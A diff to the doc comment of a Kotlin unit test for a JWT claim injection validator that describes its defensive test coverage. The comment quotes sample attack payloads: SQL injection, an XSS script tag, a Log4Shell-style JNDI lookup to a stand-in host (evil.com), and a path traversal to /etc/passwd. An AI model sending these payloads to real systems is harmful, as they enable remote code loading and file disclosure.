@@ -8,15 +8,45 @@ import org.springframework.security.oauth2.jwt.Jwt
 import java.time.Instant
 
 /**
- * Unit tests for JwtInjectionValidator (Layer 10: Injection Detection).
+ * Unit tests for JwtInjectionValidator - Layer 10 of 10-layer JWT validation system.
  *
- * Tests validate that JWT claims are scanned for malicious injection patterns
- * including SQL injection, XSS, JNDI injection, Expression Injection, and
- * Path Traversal attacks. Uses InjectionDetector for comprehensive pattern matching.
+ * Validates JWT claims against injection attack patterns (SQL injection, XSS, JNDI, Expression
+ * Injection, Path Traversal) to prevent malicious payloads embedded in Keycloak claims from
+ * reaching application code. Final defense layer before token acceptance.
  *
- * Migrated from Kotest to JUnit 6 on 2025-11-20
+ * **Test Coverage:**
+ * - Safe claims acceptance (normal user data passes)
+ * - SQL injection detection (e.g., `' OR 1=1 --`)
+ * - XSS injection detection (e.g., `<script>alert('xss')</script>`)
+ * - JNDI injection detection (e.g., `ldap://malicious.com`, Log4Shell-style)
+ * - Expression injection detection (e.g., `${jndi:ldap://evil.com}`)
+ * - Path traversal detection (e.g., `../../../etc/passwd`)
+ * - Non-string claim handling (lists, maps, numbers ignored)
+ * - Safe special characters (O'Connor, user+tag@example.com)
+ * - Multiple injection patterns (fails on first detected pattern)
  *
- * Story 3.8: User Validation and Injection Detection (Layers 9-10)
+ * **Security Patterns:**
+ * - Defense-in-depth (final validation layer before token acceptance)
+ * - OWASP Injection attack prevention (SQL, XSS, JNDI, Expression, Path Traversal)
+ * - Log4Shell protection (JNDI pattern detection)
+ * - Fail-closed validation (detected injection = rejection)
+ * - Pattern-based detection (regex matching for known attack signatures)
+ * - String claim focus (non-string claims bypass injection checks)
+ *
+ * **Testing Strategy:**
+ * - InjectionDetector pattern matching (shared with input validation)
+ * - Comprehensive attack vector coverage (OWASP Top 10 relevant patterns)
+ * - False positive prevention (safe special characters must pass)
+ * - SimpleMeterRegistry for metrics validation
+ *
+ * **Acceptance Criteria:**
+ * - Story 3.8: Injection pattern detection in JWT claims
+ * - Story 3.8: SQL injection, XSS, JNDI, Expression Injection, Path Traversal detection
+ *
+ * @see JwtInjectionValidator Primary class under test
+ * @see InjectionDetector Pattern matching engine
+ * @since JUnit 6 Migration (2025-11-20)
+ * @author EAF Testing Framework
  */
 class JwtInjectionValidatorTest {
 
